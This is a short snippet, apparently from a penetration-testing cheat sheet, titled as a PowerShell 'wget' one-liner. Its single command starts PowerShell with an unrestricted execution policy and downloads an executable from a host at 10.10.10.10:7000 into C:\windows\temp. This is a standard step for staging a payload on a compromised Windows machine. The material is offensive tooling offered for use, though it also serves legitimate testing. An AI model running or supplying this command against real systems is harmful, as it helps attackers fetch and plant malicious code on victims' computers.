# Powershell oneliner wget (anyver)
# http://dann.com.br/

@powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:7000/iw4455.exe', 'C:\windows\temp\iw4455.exe')